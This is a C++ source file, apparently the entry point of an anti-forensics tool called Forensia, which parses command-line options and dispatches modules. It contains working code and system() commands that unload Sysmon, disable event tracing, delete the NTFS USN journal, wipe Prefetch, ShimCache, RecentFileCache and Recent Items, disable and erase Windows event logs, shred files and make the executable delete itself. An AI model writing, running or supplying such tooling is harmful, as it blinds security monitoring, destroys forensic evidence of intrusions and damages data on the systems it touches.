#include "common.h"


LPWSTR g_pwszExecutionMode = nullptr;


VOID PrintUsage()
{
	wprintf(
		L"\n    ______                           _      \n"
		"   / ____/___  ________  ____  _____(_)___ _\n"
		"  / /_  / __ \\/ ___/ _ \\/ __ \\/ ___/ / __ \\`/\n"
		" / __/ / /_/ / /  /  __/ / / (__  ) / /_/ / \n"
		"/_/    \\____/_/   \\___/_/ /_/____/_/\\__,_/  \n"
		"                                            \n"
		"\n   Usage: \n"
		"     Forensia.exe <option>\n"
		"  \t-S : Sysmon Unloader\n"
		"  \t-D : Gutmann Method File Shredder\n"
		"  \t-U : USNJrnl Disabler\n"
		"  \t-P : Prefetch Disabler\n"
		"  \t-L : Windows Log Eraser And Disabler\n"
		"  \t-T : Timestamps-User Assist Disabler\n"
		"  \t-A : Access Time Disabler\n"
		"  \t-E : Event Tracing Disabler >>>>> EXPERIMENTAL AND SHOULD NOT BE USED!!!!!\n"
		"  \t-B : Remove ShellBags\n"
		"  \t-C : Clear ShimCache\n"
		"  \t-R : Delete RecentFileCache.bcf\n"
		"  \t-I : Clear Recent Items\n"
		"  \t-M : Melt Me!\n"
		//"  \t-Z : ALL OPTIONS!\n"
		"  \n\n\t Example: Forensia.exe -A\n"
		"  \t Example: Forensia.exe -D File.txt\n"
		"\n"
	);
}

BOOL ParseArguments(int argc, wchar_t* argv[])
{
	BOOL bReturnValue = TRUE;


	g_pwszExecutionMode = argv[1];


	switch (g_pwszExecutionMode[1])
	{
	case 'S':
		{
		wprintf(L"Switching To Sysmon Unloader...\n");
		SysmonUnload();
		break;
		}
	case 'D':
		{
		size_t origsize = wcslen(argv[2]) + 1;
		size_t convertedChars = 0;
		const size_t newsize = origsize * 2;
		char* nstring = new char[newsize];
		wcstombs_s(&convertedChars, nstring, newsize, argv[2], _TRUNCATE);
		wprintf(L"Switching To Shredding Module...\n");
		CorruptFunc(argc, nstring);
		break;
		}
	case 'U':
	{
		wprintf(L"Switching To USNJrnl Disabling Module...\n");
		system("fsutil.exe usn deletejournal /D C:" );
		break;
	}
	case 'E':
	{
		wprintf(L"Switching To Event Tracing Disabler Module...\n");
		disableETW();
		break;
	}
	case 'P':
	{
		wprintf(L"Switching To Prefetch Disabler...\n");
		RegFunc(1);
		system("del /F /Q C:\\Windows\\Prefetch\\*");
		break;
	}
	case 'A':
	{
		wprintf(L"Switching To NTFS Last Access Time Disabler...\n");
		RegFunc(2);
		break;
	}
	case 'T':
	{
		wprintf(L"Switching To NTFS Last Access Time Disabler...\n");
		RegFunc(3);
		break;
	}
	case 'L':
	{
		wprintf(L"Switching To Windows Event Log Disabler...\n");
		RegFunc(4);
		break;
	}
	case 'B':
	{
		wprintf(L"Switching To ShellBag Remover...\n");
		RegFunc(5);
		break;
	}
	case 'R':
	{
		wprintf(L"Deleting RecentFileCache.bcf, However It May Not Exist!\n");
		system("del C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf");
		break;
	}
	case 'C':
	{
		wprintf(L"Clearing Shim Cache Data...\n");
		system("Rundll32.exe apphelp.dll,ShimFlushCache");
		break;
	}
	case 'I':
	{
		wprintf(L"Clearing Recent Items...\n");
		system("del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\*");
		system("del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*");
		system("del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*");
		break;
	}
	/*
	case 'Z':
	{
		SysmonUnload();
		system("fsutil.exe usn deletejournal /D C:");
		RegFunc(1);
		RegFunc(2);
		RegFunc(3);
		RegFunc(4);
		RegFunc(5);
		system("del C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf");
		system("Rundll32.exe apphelp.dll,ShimFlushCache");
		system("del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\*");
		system("del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*");
		system("del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*");
		break;
	}
	*/
	case 'M':
	{
		wprintf(L"Melting The Executable...Goodbye!\n");
		MeltFile();
		break;
	}
	default:
		return (!bReturnValue);
	}

	return bReturnValue;
}


int wmain(int argc, wchar_t* argv[])
{
	if (argc > 1)
	if (!ParseArguments(argc, argv))
		PrintUsage();

	exit(0);
}
